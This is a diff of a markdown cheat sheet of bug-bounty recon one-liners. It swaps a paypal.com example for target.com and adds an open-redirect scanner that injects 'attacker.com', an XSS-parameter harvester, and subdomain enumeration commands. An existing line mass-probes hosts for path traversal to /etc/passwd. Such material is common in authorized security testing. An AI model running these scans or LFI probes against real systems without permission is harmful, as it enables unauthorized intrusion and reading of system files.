@@ -29,11 +29,29 @@ order: 3
 + ``cat files.txt | grep -aoP "(?<=(\"|\'|`))\/[a-zA-Z0-9?&=\/-#.](?=(\"|\'|`))" | sort -u | tee output.txt``
 
 ### OneLiner  http://rapiddns.io Curl for Doamin Recon :
-+ ``curl -s "https://rapiddns.io/subdomain/paypal.com?full=1#result" | grep "<td><a" | cut -d '"' -f 2 | cut -d '/' -f3  | sed 's/?t=cname//g' | sed 's/#result//g' | sed 's/\.$//' | sort -u``
++ ``curl -s "https://rapiddns.io/subdomain/target.com?full=1#result" | grep "<td><a" | cut -d '"' -f 2 | cut -d '/' -f3  | sed 's/?t=cname//g' | sed 's/#result//g' | sed 's/\.$//' | sort -u``
 
 ### Check Mass CNAME records
 + ``cat live-domains.txt | while read domains;do dig $domains;done | grep CNAME``
 
 ### Mass LFI
 + ``cat hosts | httpx -path ///////../../../etc/passwd -mc 200 -match-string 'root:x:``
+
+### Open Redirect
++ ``export LHOST="attacker.com"; gau target.com | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'``
+
+### Find JavaScript Files
++ ``assetfinder --subs-only HOST | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Zo-9_]+" | sed -e 's, 'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'):echo -e "\e[1;33m$url\n" "\e[1;32m$vars"; done``
+
+### Get Subdomain from https://riddler.io
++ ``curl -s "https://riddler.io/search/exportcsv?q=pld:target.com" | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u ``
+
+### Get subdomain domain from web archive
++ ``curl -s "http://web.archive.org/cdx/search/cdx?url=*.target.com/*&output=text&fl=original&collapse=urlkey" | sed -e 's_https*://__' -e "s/\/.*//" | sort -u
+``
+### Get subdomain from certspotter
++ ``curl -s "https://certspotter.com/api/v1/issuances?domain=HOST&include_subdomains=true&expand=dns_names" | jq .[].dns_names | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u ``
+
+### Get subdomain from securitytrails
++ ``curl -s "https://securitytrails.com/list/apex_domain/HOST" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | grep ".HOST" | sort -u``
 
